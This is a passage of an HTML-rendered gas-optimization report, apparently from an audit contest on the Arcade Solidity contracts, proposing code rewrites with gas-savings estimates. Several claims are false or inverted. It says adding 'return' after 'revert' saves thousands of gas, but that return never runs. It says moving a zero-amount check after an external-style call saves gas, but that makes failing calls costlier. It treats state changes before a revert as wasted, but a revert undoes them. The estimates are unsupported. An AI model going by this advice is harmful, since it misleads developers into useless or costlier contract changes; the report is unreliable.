class=\"mtk1\">(</span><span class=\"mtk12\">grant</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegatee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk12\">grant</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegatee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">delegateeVotes</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">newVotingPower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">VoteChange</span><span class=\"mtk1\">(</span><span class=\"mtk12\">grant</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegatee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">who</span><span class=\"mtk1\">, </span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newVotingPower</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Estimated gas saved:<br>\nThis optimization could save around 1000 to 2000 gas per transaction, depending on the gas cost of the function call.</p>\n<h3 id=\"possible-optimization-2-2\" style=\"position:relative;\"><a href=\"#possible-optimization-2-2\" aria-label=\"possible optimization 2 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Possible Optimization 2</h3>\n<p>In the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ARCDVestingVault.sol#L228C1-L253C6\">claim</a> function, there are multiple calls to <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ARCDVestingVault.sol#L232C1-L249C45\">ARCDVestingVaultStorage.Grant storage grant = _grants()[msg.sender];</a>. This could be optimized by declaring it once at the beginning of the function and reusing the reference. This would save the gas used by the function call.</p>\n<p>After Optimization:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claim</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ARCDVestingVaultStorage</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Grant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">grant</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_grants</span><span class=\"mtk1\">()[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AVV_InvalidAmount</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">grant</span><span class=\"mtk1\">.</span><span class=\"mtk12\">allocation</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AVV_NoGrantSet</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">grant</span><span class=\"mtk1\">.</span><span class=\"mtk12\">cliff</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AVV_CliffNotReached</span><span class=\"mtk1\">(</span><span class=\"mtk12\">grant</span><span class=\"mtk1\">.</span><span class=\"mtk12\">cliff</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// get the withdrawable amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">withdrawable</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getWithdrawableAmount</span><span class=\"mtk1\">(</span><span class=\"mtk12\">grant</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">withdrawable</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AVV_InsufficientBalance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">withdrawable</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// update the grant&#39;s withdrawn amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">withdrawable</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">grant</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawn</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">withdrawable</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">grant</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawn</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">withdrawable</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// update the user&#39;s voting power</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_syncVotingPower</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">grant</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// transfer the available amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">withdrawable</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Estimated gas saved:<br>\nThis optimization could save around 1000 to 2000 gas per transaction, depending on the gas cost of the function call.</p>\n<h3 id=\"possible-optimization-3\" style=\"position:relative;\"><a href=\"#possible-optimization-3\" aria-label=\"possible optimization 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Possible Optimization 3</h3>\n<p>In the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ARCDVestingVault.sol#L157C5-L186C6\">revokeGrant</a> function, the contract performs a number of operations after checking if the grant allocation is zero. If the allocation is zero, these operations are unnecessary. By using a return statement after the revert, we can avoid these unnecessary operations.</p>\n<p>Before:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// if the grant has already been removed or no grant available, revert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">grant</span><span class=\"mtk1\">.</span><span class=\"mtk12\">allocation</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AVV_NoGrantSet</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p>After: </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// if the grant has already been removed or no grant available, revert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">grant</span><span class=\"mtk1\">.</span><span class=\"mtk12\">allocation</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AVV_NoGrantSet</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Estimated gas saved:<br>\nThis optimization could save around 5,000 to 10,000 gas per transaction, depending on the number of operations that are skipped.</p>\n<h2 id=\"possible-optimizations-in-nftboostvaultsol\" style=\"position:relative;\"><a href=\"#possible-optimizations-in-nftboostvaultsol\" aria-label=\"possible optimizations in nftboostvaultsol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Possible Optimizations in <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol\">NFTBoostVault.sol</a></h2>\n<h3 id=\"possible-optimization-1-3\" style=\"position:relative;\"><a href=\"#possible-optimization-1-3\" aria-label=\"possible optimization 1 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Possible Optimization 1</h3>\n<p>In the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L114C1-L126C6\">addNftAndDelegate</a> function, the amount is checked to be non-zero at the beginning of the function. However, the amount is not used until after the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L122C7-L122C84\">_registerAndDelegate</a> function call. Moving the zero check closer to the usage of the amount could save gas in the case where <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L122C7-L122C84\">_registerAndDelegate</a> reverts, as the zero check would not have been performed.</p>\n<p>After Optimization:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addNftAndDelegate</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">delegatee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_registerAndDelegate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">delegatee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NBV_ZeroAmount</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_lockTokens</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Estimated gas saved:<br>\nThis optimization could save around 200 to 500 gas per transaction, depending on the gas cost of the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L122C7-L122C84\">_registerAndDelegate</a> function call.</p>\n<h3 id=\"possible-optimization-2-3\" style=\"position:relative;\"><a href=\"#possible-optimization-2-3\" aria-label=\"possible optimization 2 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Possible Optimization 2</h3>\n<p>In the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L462C5-L510C6\">_registerAndDelegate</a> function, the multiplier is set to <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L469C9-L469C34\">1e3</a> by default and then potentially updated if <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L472C1-L477C63\">_tokenAddress</a> and <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L472C1-L477C63\">_tokenId</a> are non-zero. However, the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L421C1-L424C10\">getMultiplier</a> function already returns <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L421C1-L424C10\">1e3</a> if <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L421C1-L424C10\">_tokenAddress</a> or <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L421C1-L424C10\">_tokenId</a> are zero. Therefore, the initial setting of the multiplier to <code>1e3</code> is unnecessary and can be removed.</p>\n<p>After Optimization: </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_tokenAddress</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk11\">IERC1155</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">) == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NBV_DoesNotOwn</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">multiplier</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getMultiplier</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">multiplier</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NBV_NoMultiplierSet</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p>Estimated gas saved:<br>\nThis optimization could save around 200 to 500 gas per transaction, depending on the gas cost of the <code>getMultiplier</code> function call.</p>\n<h3 id=\"possible-optimization-3-1\" style=\"position:relative;\"><a href=\"#possible-optimization-3-1\" aria-label=\"possible optimization 3 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Possible Optimization 3</h3>\n<p>In the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L579C1-L599C6\">_syncVotingPower</a> function, the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L588C5-L594C10\">change</a> variable is calculated and then checked to be non-zero. If the change is zero, the function returns early. However, the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L588C5-L594C10\">change</a> calculation involves subtraction and two castings, which are relatively expensive operations. By checking if <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L583C8-L583C68\">newVotingPower</a> and <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L596C1-L596C66\">registration.latestVotingPower</a> are equal before performing the change calculation, we can potentially avoid these operations.</p>\n<p>After Optimization:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">newVotingPower</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">registration</span><span class=\"mtk1\">.</span><span class=\"mtk12\">latestVotingPower</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">change</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newVotingPower</span><span class=\"mtk1\">) - </span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">registration</span><span class=\"mtk1\">.</span><span class=\"mtk12\">latestVotingPower</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p>Estimated gas saved:<br>\nThis optimization could save around 500 to 1000 gas per transaction, depending on the gas cost of the subtraction and casting operations.</p>\n<h2 id=\"possible-optimization-in-arcadetokensol\" style=\"position:relative;\"><a href=\"#possible-optimization-in-arcadetokensol\" aria-label=\"possible optimization in arcadetokensol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Possible Optimization in <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/token/ArcadeToken.sol\">ArcadeToken.sol</a></h2>\n<p>In the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/token/ArcadeToken.sol#L145C1-L160C6\">mint</a> function, the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/token/ArcadeToken.sol#L146C1-L151C72\">mintingAllowedAfter</a> variable is updated before the minting cap check. This means that even if the minting cap check fails and reverts the transaction, the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/token/ArcadeToken.sol#L146C1-L151C72\">mintingAllowedAfter</a> variable will still have been updated, wasting gas. Moving the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/token/ArcadeToken.sol#L146C1-L151C72\">mintingAllowedAfter</a> update after the minting cap check could save gas in the case where the minting cap check fails.</p>\n<p>After Optimization:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintCapAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() * </span><span class=\"mtk12\">MINT_CAP</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">PERCENT_DENOMINATOR</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">mintCapAmount</span><span class=\"mtk1\">) 